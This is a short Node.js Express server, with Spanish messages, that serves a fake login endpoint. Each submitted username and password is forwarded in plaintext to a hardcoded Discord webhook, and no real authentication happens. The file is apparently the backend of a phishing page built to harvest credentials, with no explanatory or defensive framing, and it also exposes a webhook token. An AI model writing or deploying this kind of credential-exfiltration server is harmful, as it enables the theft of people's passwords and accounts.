const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

const webhookURL = 'https://discord.com/api/webhooks/1374528040390098964/waU_ie6bKikSPJ8nqK9r6ppK6_xm5hOEZoo6RlCDaqWX3vCI2bGreY2rjK9FwckeQf4V';

app.post('/login', async (req, res) => {
  const { usuario, password } = req.body;

  const content = `**Nuevo login:**\nUsuario: ${usuario}\nContraseña: ${password}`;

  try {
    const discordRes = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content }),
    });

    if (discordRes.ok) {
      res.status(200).send('Datos enviados correctamente');
    } else {
      res.status(500).send('Error enviando datos a Discord');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Error en el servidor');
  }
});

app.listen(PORT, () => {
  console.log(`Servidor escuchando en http://localhost:${PORT}`);
});
